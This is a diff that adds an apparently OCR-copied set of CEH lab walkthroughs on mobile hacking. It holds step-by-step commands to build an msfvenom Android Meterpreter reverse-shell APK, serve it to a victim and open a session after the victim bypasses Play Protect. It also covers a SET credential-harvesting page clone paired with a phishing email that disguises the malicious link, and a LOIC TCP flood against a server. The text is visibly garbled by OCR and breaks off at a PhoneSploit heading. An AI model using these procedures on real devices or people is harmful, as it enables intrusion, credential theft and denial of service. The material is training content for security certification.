@@ -1,0 +1,122 @@
+Hack an Android Device by Creating Binary Payloads using Parrot Security
+
+In parrot Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window
+In the Parrot Terminal window, type service postgresql start and press Enter to start the database service
+Type msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.10.13 R > Desktop/Backdoor.apk and press Enter to generate a backdoor, 
+or reverse meterpreter application.
+Note: This command creates an APK (Backdoor.apk) on Desktop under the Root directory. In this case, 10.10.10.13 is the IP address of the Parrot Security virtual machine. 
+This IP address may differ in your lab environment
+Now, share or send the Backdoor.apk file to the victim machine (in this lab, we are using the Android emulator as the victim machine).
+Note: In this task, we are sending d1e malicious payload through a shared directory, but in real-life cases, attackers may send it via an attachment in an
+email, over Bluetooh, or through some other application or means.
+Type cp /root/Desktop/Backdoor.apk /var/www/html/share/ and press Enter to copy the file to the share folder.
+Note: If the shared folder is not present, navigate to /var/www/html and create a folder named share.
+ Now, type service apache2 start and press Enter to start the Apache web server.
+ Type msfconsole and press Enter to launch the Metasploit framework.
+In msfconsole, type use exploit/multi/handler and press Enter.
+Now, issue the following commands in msfconsole:•
+Type set payload android/meterpreter/reverse_tcp and press Enter.
+Type set LHOST 10.10.10.13 and press Enter .
+Type show options and press Enter. This command lets you know the listening port (in this case, 4444),
+Type exploit -j -z and press Enter. This command runs the exploit as a backgrotmd job.
+Switch to the Android emulator virtual machine.
+In the Android Emulator GUI, click the Chrome icon on the lower section of the Home Screen to launch d1e browser.
+In the address bar, type http://10.10.10.13/share and press Enter.
+Note: If a pop up appears, click Allow.
+The lndex of /share page appears; click Backdoor.apk to download the application package file.
+After the download finishes, a notification appears at the bottom of the browser window. Click Open to open the application.
+A MainActivity screen appears; click Next, and then lnstall.
+A Blocked by Play Protect pop-up appears; click INSTALL ANYWAY
+A Send app for scanning? pop-up appears; click DON'T SENO.
+After the application installs successfully, an App installed notification appears; click OPEN.
+Switch back to the Parrot Security virtual machine. The meterpreter session has been opened successfully, as shown in the screenshot.
+Note: In this case, 10.10.10.14 is the IP address of the victim machine (Android Emulator) . The IP addresses may vary in your lab environment.
+Type sessions -i 1 and press Enter. The Meterpreter shell is launched as shown in the screenshot.
+Note: In this command, 1 specifies the number of the session.
+Type sysinfo and press Enter. Issuing this command displays the information the target machine such as computer name, OS, etc.
+Type ipconfig and press Enter to display the victim machine's network interfaces, IP address (IPv4 and 1Pv6), MAC address, etc. 
+Type pwd and press Enter to view the current or present working directory on the remote (target) machine
+Type cd /sdcard to change the current remote directory to sdcard.
+Note: The cd command changes the current remote directory.
+Now, type pwd and press Enter. You will observe that the present working directory has changed to sdcard, that is, /storage/emulated/0.
+Now, still in the Meterpreter session, type ps and press Enter to view the processes running in the target system.
+Note: The list of running processes might differ in your lab environment
+
+Harvest Users' Credentials using the Social-Engineer Toolkit
+
+Log in to the Parrot Security virtual macrune.
+Click Applications in the top-left corner of Desktop and navigate to Pentesting -> Exploitation Tools -> Social Engineeñng -> social engineering toolkit.
+Type y and press Enter to agree to the terms of services.
+The SET menu appears, as shown in the screenshot. Type 1 and press Enter to choose Sociai-Engineering Attacks.
+A list of options for Social-Engineering Attacks appears; type 2 and press Enter to choose Website Attack Vectors.A list of Website Attack Vector options appears; 
+type 3 and press Enter to choose Credential Harvester Attack Method
+Now, we need to create a clone of the Facebook login page. Type 2 and press Enter to choose Site Cloner from the menu.
+Type the IP address of the local machine (Parrot Security) in the prompt for "IP address for the POST back in Harvester/Tabnabbing" and press Enter.
+Note: The IP address of Parrot Security in this case is 10.10.10.13, but this may vary in your lab environment.
+11. Now, you will be prompted for a URL to be cloned; type the desired URL in "Enter the url to clone" and press Enter. In this example, we are cloning the URL
+http://certifiedhacker.com/Online%20Booking/index.htm.
+Note: You can clone any URL of your choice.
+If a Press {return} if you understand what we're saying here message appears, press Enter.
+Note: If a message appears asking Do you want to attempt to disable Apache?, type y and press Enter
+After cloning is completed, the highlighted message appears and he credencial harvester initiates, 
+Now, you must send the IP address of your Parrot Security virtual machine to a victim and trick them to click on it. Minimize the Terminal window.
+Remaining on your Parrot Security virtual machine, click on the Firefox icon in the top section of Desktop to launch the Firefox web browser.
+In the Firefox browser window, open your email account (in this example, Gmail) and log in.
+Note: You can use any email account of your choice.
+17. After logging into your email account, click the Compose button and craft a fake email that will lure a user into opening and clicking on a malicious link.
+Note: we will disguise the malicious link behind a fake link that looks safe to click.
+18. Having written an enticing message in the body of the email, move the cursor to wheres u wish to place the malicious link. Then, click the lnsert link icon.
+In the Edit Link window, first type the actual address of your cloned site in the web address field under the Link to section in the Web address field, type the actual 
+(malicious) IP address. Then, type the fake URL in the Text to display field. In this case, the actual address of our cloned certifedhacker si te is http://10.10.10.13, 
+and the text that will be  displayed in the message is http://www.bookhotel.com/change_account_password; click OK.
+The fake URL should now appear in the message body
+To verify that the fake URL is linked to the real one, click the fake URL; it will display d1e actual URL as " Go to link.'' Once verified, send the
+email to the intended user
+Switch to the Android virtual machine.
+Note: Restart the Android virtual machine if it is not responding.
+Click the Google Chrome icon Chrome on the Home screen to launch
+ In the Google Chrome browser window, sign in to the account to which you sent the phishing mail as an attacker. Open the email you sent
+previously and click to open the malicious link.
+N ote: We are opening the phishing mail as a victim
+When the victim (in this case, you) clicks the URL, a new tab opens up, and a replica of www.certifiedhacker.com loads.
+The hotel booking page appears, scroll-down to the end of the page. 
+Here, the victim will be prompted to enter his/her username and password into the form fields, which appear as they do on the genuine website. 
+When the victim enters the Username and Password and clicks Login, the page shows an error, as shown in the second screenshot
+As soon as the victim types in their Username and Password and clicks Log In, SET, which is runing in Parrot Security, fetches the typed
+credentials, which can then be used by the attacker to gain unauthorized access to the victim's account.
+Switch to the Parrot Security virtual machine. In the terminal window, scroll down to find a Username and Password, displayed in plain text..
+
+
+Launch a DoS Attack on a Target Machine using Low Orbital Cannon (LOIC) on the Android Mobile Platform
+
+Switch to the Android virtual machine. On the Home screen, swipe from right to left to navigate to the second page of the Home screen
+On the second page of the Home screen, click the Cx File Explorer app
+Cx File Explorer opens; click 10.10.10.10 from the Network tab and navigate to CEH-Tools -> CEHv11 Module 17 Hacking Mobile Platforms -> 
+Android Hacking Tools -> Low Orbit Ion Cannon (LOIC).
+Click the Low Orbit Ion Cannon LOIC_v1.3.apk file
+A Do you want to install this application? screen appears, click INSTALL
+The installation begins; on completion, an App installed notification appears; click OPEN to launch the app
+On the LOIC screen, we will seta target website or machine. In this task,
+we shall launch a DoS attack on Windows Server 2019 (10.10.10.19) machine.
+In the left pane, in the URL field, type 10.10.10.19 and click the GET IP button.
+The IP address of the target machine is displayed under the Manual IP option
+To launch d1e attack, first select d1e TCP radio button; in the right pane, enter 80 as the Port number and in the Threads field, enter 100. Then,
+click the Start button
+LOIC begins to flood the target machine with TCP packets, which we will see by running Wireshark Switch to the Windows Server 2019 virtual machine and login with the
+credentials Administrator/ Pa$$w0rd.
+14. Click d1e Type here to search field at d1e bottom of Desktop and type wireshark. Then, click Wireshark from the results.
+Note: If Wireshark is not installed in d1e Windows Server 2019 virtual machine, then navigate to the location 
+Z:\CEHv11 Module 03 Scanning Networks\Banner Grabbing Tools\Wireshark and double-click Wiresharkwin64-3.0.5.exe file and install Wireshark using default settings.
+15. The Wireshark Network Analyzer opens; double-click on the primary network interface (in this case, EthemetO) to start capturing network traffic
+Switch to the Windows Server 2019 virtual machine and login with the
+credentials Administrator/ Pa$$w0rd.
+Wireshark starts capturing network packets. Note the huge number of packets coming from the attackers' maclúne (in dús case, Android, which
+has the IP address 10.10.10.14), as shown in the screenshot.
+17. The packets from 10.10.10.14 are sent to d1e target maclúne (Windows Server 2019), whose IP address is 10.10.10.19.
+Now, click the Stop capturing packets icon the process. in the toolbar to stop
+19. Observe the huge number of packets sent tn the Packets field at the bottom of the Wireshark window
+Now switch back to the Android virtual machine and halt the DoS attack by clicking the STOP button
+
+
+Exploit the Android Platform through ADB using PhoneSploit
+
